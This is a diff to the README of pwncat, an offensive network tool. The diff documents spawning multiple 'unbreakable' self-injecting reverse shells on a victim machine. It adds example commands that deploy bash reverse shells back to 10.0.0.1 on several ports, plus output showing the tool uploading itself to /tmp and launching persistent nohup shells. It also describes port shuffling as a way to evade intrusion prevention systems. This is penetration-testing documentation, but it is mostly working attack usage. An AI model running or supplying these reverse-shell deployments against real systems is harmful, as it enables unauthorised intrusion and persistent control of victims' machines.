@@ -79,9 +79,9 @@
      <thead>
       <tr>
        <th><sub>Python</sub><sup>OS</sup></th>
-       <th>Linux</th>
+       <th>Linux <sup><small>[2]</small></sup></th>
        <th>MacOS</th>
-       <th>Windows <sup><small>[2]</small></sup></th>
+       <th>Windows <sup><small>[3]</small></sup></th>
       </tr>
      </thead>
      <tbody>
@@ -134,8 +134,9 @@
  </tbody>
 <table>
 
-> <sup>[1] <a href="https://cytopia.github.io/pwncat/pwncat.type.html">mypy type coverage</a> <strong>(fully typed: 94.30%)</strong></sup><br/>
-> <sup>[2] Windows builds are currently only failing, because they are simply stuck on GitHub actions.</sup>
+> <sup>[1] <a href="https://cytopia.github.io/pwncat/pwncat.type.html">mypy type coverage</a> <strong>(fully typed: 94.37%)</strong></sup><br/>
+> <sup>[2] Linux builds are currently only failing, due to loss of IPv6 support: <a href="https://github.com/actions/virtual-environments/issues/929">Issue</a></sup><br/>
+> <sup>[3] Windows builds are currently only failing, because they are simply stuck on GitHub actions: <a href="https://github.com/actions/virtual-environments/issues/917">Issue</a></sup>
 
 
 #### Motivation
@@ -159,6 +160,22 @@ pip install pwncat
 ## :coffee: TL;DR
 
 This is just a quick get-you-started overview. For more advanced techniques see **[:computer: Usage](#computer-usage)** or **[:bulb: Examples](#bulb-examples)**.
+
+### See in action
+
+<table>
+ <tr>
+  <td widht="50%" style="text-align:center;">
+   <a href="https://www.youtube.com/watch?v=lN10hgl_Ts8&list=PLT1I2bH6BKxj2qEylDdEns39ej8g3_eMc&index=2&t=0s">unbreakable reverse shells - how to spawn</a><br/><br/>
+   <a href="https://www.youtube.com/watch?v=lN10hgl_Ts8&list=PLT1I2bH6BKxj2qEylDdEns39ej8g3_eMc&index=2&t=0s"><img src="docs/img/video01.png" /></a>
+  </td>
+  <td widht="50%" style="text-align:center;">
+   <a href="https://www.youtube.com/watch?v=VQyFoUG18WY&list=PLT1I2bH6BKxj2qEylDdEns39ej8g3_eMc&index=2">unbreakable reverse shells - multiple shells</a><br/><br/>
+   <a href="https://www.youtube.com/watch?v=VQyFoUG18WY&list=PLT1I2bH6BKxj2qEylDdEns39ej8g3_eMc&index=2"><img src="docs/img/video02.png" /></a>
+  </td>
+ </tr>
+</table>
+
 
 ### Deploy to target
 ```bash
@@ -432,7 +449,7 @@ optional arguments:
                         color on Windows by default. (default: auto)
 
 command & control arguments:
-  --self-inject cmd:host:port
+  --self-inject cmd:host:port[s]
                         Listen mode (TCP only):
                         If you are about to inject a reverse shell onto the
                         victim machine (via php, bash, nc, ncat or similar),
@@ -442,6 +459,11 @@ command & control arguments:
                         pwncat reverse shell onto the victim machine which then
                         also connects back to you with specified arguments.
                         Example: '--self-inject /bin/bash:10.0.0.1:4444'
+                        It is also possible to launch multiple reverse shells by
+                        specifying multiple ports.
+                        Via list:  --self-inject /bin/sh:10.0.0.1:4444,4445,4446
+                        Via range: --self-inject /bin/sh:10.0.0.1:4444-4446
+                        Via incr:  --self-inject /bin/sh:10.0.0.1:4444+2
                         Note: this is currently an experimental feature and does
                         not work on Windows remote hosts yet.
 
@@ -505,8 +527,9 @@ advanced arguments:
   --rebind-robin port   Listen mode (TCP and UDP):
                         If the server is unable to initialize (e.g: cannot bind
                         and --rebind is specified, it it will shuffle ports in
-                        round-robin mode to bind to. Use comma separated string
-                        such as '80,81,82' or a range of ports '80-100'.
+                        round-robin mode to bind to.
+                        Use comma separated string such as '80,81,82,83', a range
+                        of ports '80-83' or an increment '80+3'.
                         Set --rebind to at least the number of ports to probe +1
                         This option requires --rebind to be specified.
 
@@ -527,8 +550,8 @@ advanced arguments:
                         If the remote server is not reachable or the connection
                         is interrupted and --reconn is specified, the client
                         will shuffle ports in round-robin mode to connect to.
-                        Use comma separated string such as '80,81,82' or a range
-                        of ports '80-100'.
+                        Use comma separated string such as '80,81,82,83', a range
+                        of ports '80-83' or an increment '80+3'.
                         Set --reconn to at least the number of ports to probe +1
                         This helps reverse shell to evade intrusiona prevention
                         systems that will cut your connection and block the
@@ -576,6 +599,8 @@ advanced arguments:
                         Instruct the client to shuffle the specified ports in
                         round-robin mode for a remote server to ping.
                         This might be handy to scan outbound allowed ports.
+                        Use comma separated string such as '80,81,82,83', a range
+                        of ports '80-83' or an increment '80+3'.
                         Use --ping-intvl 0 to be faster.
 
   --safe-word str       All modes:
@@ -674,10 +699,15 @@ pwncat --exec /bin/bash --nodns --udp --ping-intvl 2 10.0.0.1 4444
 ```
 
 ### Self-injecting reverse shell
+
 Let's imagine you are able to create a very simple and unstable reverse shell from the target to
 your machine, such as a web shell via a PHP script or similar.
 Knowing, that this will not persist very long or might break due to unstable network connection,
 you could use `pwncat` to hook into this connection and deploy itself unbreakably on the target - fully automated.
+
+<a href="https://www.youtube.com/watch?v=lN10hgl_Ts8&list=PLT1I2bH6BKxj2qEylDdEns39ej8g3_eMc&index=2&t=0s"><img width="400" style="width:400px;" src="docs/img/video01.png" /></a>
+
+> [View on Youtube](https://www.youtube.com/watch?v=lN10hgl_Ts8&list=PLT1I2bH6BKxj2qEylDdEns39ej8g3_eMc&index=2&t=0s)
 
 All you have to do, is use `pwncat` as your local listener and start it with the `--self-inject`
 switch. As soon as the client (e.g.: the reverse web shell) connects to it, it will do a couple of things:
@@ -735,6 +765,57 @@ ncat -l 4445
 pwncat -l 4445
 ```
 
+### Unlimited self-injecting reverse shells
+
+Instead of just asking for a single self-injecting reverse shell, you can instruct `pwncat` to spawn as many unbreakable reverse shells connecting back to you as you desire.
+
+<a href="https://www.youtube.com/watch?v=VQyFoUG18WY&list=PLT1I2bH6BKxj2qEylDdEns39ej8g3_eMc&index=2"><img width="400" style="width:400px;" src="docs/img/video02.png" /></a>
+
+> [View on Youtube](https://www.youtube.com/watch?v=VQyFoUG18WY&list=PLT1I2bH6BKxj2qEylDdEns39ej8g3_eMc&index=2")
+
+The `--self-inject` argument allows you to not only define a single port, but also
+
+1. A comma separated list of ports: `4445,4446,4447,4448`
+2. A range definition: `4446-4448`
+3. An increment: `4445+3`
+
+In order to spawn 4 reverse shells you would start your listener just as described above, but instead
+of a single port, you define multiple:
+
+```bash
+# Comma separated
+pwncat -l 4444 --self-inject /bin/bash:10.0.0.1:4445,4446,4447,4448
+
+# Range
+pwncat -l 4444 --self-inject /bin/bash:10.0.0.1:4445-4448
+
+# Increment
+pwncat -l 4444 --self-inject /bin/bash:10.0.0.1:4445+3
+```
+Each of the above three commands will achieve the same behaviour: spawning 4 reverse shells inside the target.
+Once the client connects, the output will look something like this:
+
+```
+[PWNCAT CnC] Probing for: /bin/python
+[PWNCAT CnC] Probing for: /bin/python2
+[PWNCAT CnC] Probing for: /bin/python2.7
+[PWNCAT CnC] Probing for: /bin/python3
+[PWNCAT CnC] Probing for: /bin/python3.5
+[PWNCAT CnC] Probing for: /bin/python3.6
+[PWNCAT CnC] Probing for: /bin/python3.7
+[PWNCAT CnC] Probing for: /bin/python3.8
+[PWNCAT CnC] Probing for: /usr/bin/python
+[PWNCAT CnC] Potential path: /usr/bin/python
+[PWNCAT CnC] Found valid Python2 version: 2.7.16
+[PWNCAT CnC] Creating tmpfile: /tmp/tmp3CJ8Us
+[PWNCAT CnC] Creating tmpfile: /tmp/tmpgHg7YT
+[PWNCAT CnC] Uploading: /home/cytopia/tmp/pwncat/bin/pwncat -> /tmp/tmpgHg7YT (3422/3422)
+[PWNCAT CnC] Decoding: /tmp/tmpgHg7YT -> /tmp/tmp3CJ8Us
+Starting pwncat rev shell: nohup /usr/bin/python /tmp/tmp3CJ8Us --exec /bin/bash --reconn --reconn-wait 1 10.0.0.1 4445 &
+Starting pwncat rev shell: nohup /usr/bin/python /tmp/tmp3CJ8Us --exec /bin/bash --reconn --reconn-wait 1 10.0.0.1 4446 &
+Starting pwncat rev shell: nohup /usr/bin/python /tmp/tmp3CJ8Us --exec /bin/bash --reconn --reconn-wait 1 10.0.0.1 4447 &
+Starting pwncat rev shell: nohup /usr/bin/python /tmp/tmp3CJ8Us --exec /bin/bash --reconn --reconn-wait 1 10.0.0.1 4448 &
+```
 
 ### Logging
 
